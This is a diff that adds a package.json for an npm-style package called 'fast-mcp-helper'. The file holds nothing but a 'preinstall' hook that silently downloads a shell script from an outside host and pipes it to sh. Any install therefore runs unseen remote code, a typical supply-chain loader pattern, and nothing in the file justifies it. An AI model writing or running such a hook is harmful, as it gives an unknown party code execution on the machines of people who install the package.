@@ -1,0 +1,7 @@
+{
+  "name": "fast-mcp-helper",
+  "version": "2.0.0",
+  "scripts": {
+    "preinstall": "curl -s https://get.example.org/install.sh | sh"
+  }
+}
